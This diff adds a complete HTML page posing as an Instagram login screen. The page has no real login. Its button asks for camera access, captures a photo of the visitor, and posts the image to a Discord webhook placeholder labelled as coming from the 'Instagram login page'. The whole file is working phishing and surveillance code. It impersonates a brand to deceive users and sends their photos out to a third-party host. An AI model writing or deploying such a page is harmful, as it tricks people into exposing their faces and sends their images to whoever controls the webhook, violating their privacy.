@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fafafa;
+        }
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-btn {
+            padding: 10px 20px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #007bb5;
+        }
+        video {
+            width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Instagram Login</h2>
+        <button class="login-btn" id="loginBtn">Login with Instagram</button>
+        <div id="camera-container" style="display: none;">
+            <h3>Allow Camera Access</h3>
+            <video id="video" autoplay></video>
+            <button class="login-btn" id="captureBtn">Capture Photo</button>
+        </div>
+    </div>
+
+    <script>
+        const loginBtn = document.getElementById('loginBtn');
+        const cameraContainer = document.getElementById('camera-container');
+        const video = document.getElementById('video');
+        const captureBtn = document.getElementById('captureBtn');
+        
+        // Request camera permissions when login button is clicked
+        loginBtn.addEventListener('click', async () => {
+            try {
+                // Request user to allow camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                cameraContainer.style.display = 'block';
+                loginBtn.style.display = 'none';
+            } catch (error) {
+                alert('Camera permission denied!');
+            }
+        });
+
+        // Capture image and send to Discord
+        captureBtn.addEventListener('click', () => {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Send image data to Discord
+            sendToDiscord(imageData);
+        });
+
+        // Send image to Discord via webhook
+        async function sendToDiscord(imageData) {
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const payload = {
+                content: 'New image from Instagram login page',
+                embeds: [{
+                    image: {
+                        url: imageData
+                    }
+                }]
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                alert('Image sent to Discord!');
+            } else {
+                alert('Failed to send image to Discord.');
+            }
+        }
+    </script>
+</body>
+</html>
